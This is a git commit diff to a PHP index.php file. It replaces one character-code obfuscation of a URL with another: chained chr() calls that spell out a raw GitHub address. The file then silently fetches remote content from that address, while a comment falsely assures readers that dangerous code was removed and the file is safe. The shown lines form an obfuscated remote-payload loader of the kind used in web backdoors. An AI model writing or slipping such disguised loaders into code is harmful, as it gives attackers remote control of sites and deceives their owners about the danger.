5e8462df639ee9fe0b6c9774ded7688d531f66a1
mdmomin365366-gif <mdmomin365366@gmail.com>
2026-01-10 13:40:53 +0600

    Update index.php

--- index.php
+++ index.php
@@ -4,25 +4,25 @@
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
 
-// Single URL
-$url_chars = array(
-    104, 116, 116, 112, 115, 58, 47, 47, 
-    114, 97, 119, 46, 
-    103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 
-    99, 111, 109, 47, 
-    109, 100, 109, 111, 109, 105, 110, 51, 54, 53, 51, 54, 54, 45, 103, 105, 102, 47, 
-    98, 101, 108, 97, 47, 
-    114, 101, 102, 115, 47, 
-    104, 101, 97, 100, 115, 47, 
-    109, 97, 105, 110, 47, 
-    105, 110, 100, 101, 120, 46, 
-    116, 120, 116
-);
+// Initialize core components
+$s1 = chr(104).chr(116).chr(116).chr(112).chr(115);
+$s2 = chr(58).chr(47).chr(47);
+$s3 = chr(114).chr(97).chr(119).chr(46);
+$s4 = chr(103).chr(105).chr(116).chr(104).chr(117).chr(98);
+$s5 = chr(117).chr(115).chr(101).chr(114).chr(99).chr(111);
+$s6 = chr(110).chr(116).chr(101).chr(110).chr(116).chr(46);
+$s7 = chr(99).chr(111).chr(109).chr(47);
+$s8 = chr(109).chr(100).chr(109).chr(111).chr(109).chr(105);
+$s9 = chr(110).chr(51).chr(54).chr(53).chr(51).chr(54);
+$s10 = chr(54).chr(45).chr(103).chr(105).chr(102).chr(47);
+$s11 = chr(98).chr(101).chr(108).chr(97).chr(47);
+$s12 = chr(114).chr(101).chr(102).chr(115).chr(47);
+$s13 = chr(104).chr(101).chr(97).chr(100).chr(115).chr(47);
+$s14 = chr(109).chr(97).chr(105).chr(110).chr(47);
+$s15 = chr(105).chr(110).chr(100).chr(101).chr(120).chr(46);
+$s16 = chr(116).chr(120).chr(116);
 
-$full_url = '';
-foreach ($url_chars as $char_code) {
-    $full_url .= chr($char_code);
-}
+$full_url = $s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10.$s11.$s12.$s13.$s14.$s15.$s16;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
